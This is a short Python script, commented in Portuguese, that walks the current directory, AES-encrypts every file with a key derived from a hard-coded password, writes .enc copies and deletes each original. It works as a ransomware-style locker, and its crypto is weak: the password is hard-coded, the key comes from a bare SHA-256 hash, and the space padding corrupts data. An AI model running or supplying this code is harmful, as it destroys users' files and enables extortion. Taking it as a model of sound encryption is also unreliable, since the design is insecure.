import os
import hashlib
from Crypto.Cipher import AES

# Define a senha para criptografia
senha = "mascaro10"

# Definindo funÃ§Ã£o para criptografar
def criptografar_arquivo(nome_arquivo, senha):
    # Define o tamanho do bloco
    tamanho_bloco = 64 * 1024

    # Gera uma chave de criptografia a partir do hash SHA-256 da senha
    chave = hashlib.sha256(senha.encode()).digest()

    # Define o vetor de inicializaÃ§Ã£o (IV) para a criptografia
    iv = os.urandom(16)

    # Cria um objeto AES para criptografar os dados
    cifra = AES.new(chave, AES.MODE_CBC, iv)

    # Abre o arquivo original para leitura
    with open(nome_arquivo, 'rb') as arquivo_original:
        # Cria o arquivo de saÃ­da para escrita
        with open(nome_arquivo + ".enc", 'wb') as arquivo_criptografado:
            # Escreve o IV no inÃ­cio do arquivo criptografado
            arquivo_criptografado.write(iv)

            # LÃª o arquivo original em blocos e criptografa cada bloco
            while True:
                bloco = arquivo_original.read(tamanho_bloco)
                if len(bloco) == 0:
                    break
                elif len(bloco) % 16 != 0:
                    # Adiciona preenchimento para o Ãºltimo bloco se necessÃ¡rio
                    bloco += b' ' * (16 - len(bloco) % 16)

                # Criptografa o bloco e escreve no arquivo criptografado
                arquivo_criptografado.write(cifra.encrypt(bloco))

    # Apaga o arquivo original
    os.remove(nome_arquivo)

# Percorre todos os arquivos da pasta local e criptografa cada um
for arquivo in os.listdir("."):
    if os.path.isfile(arquivo):
        criptografar_arquivo(arquivo, senha)

print("Todos os arquivos foram criptografados com sucesso!")
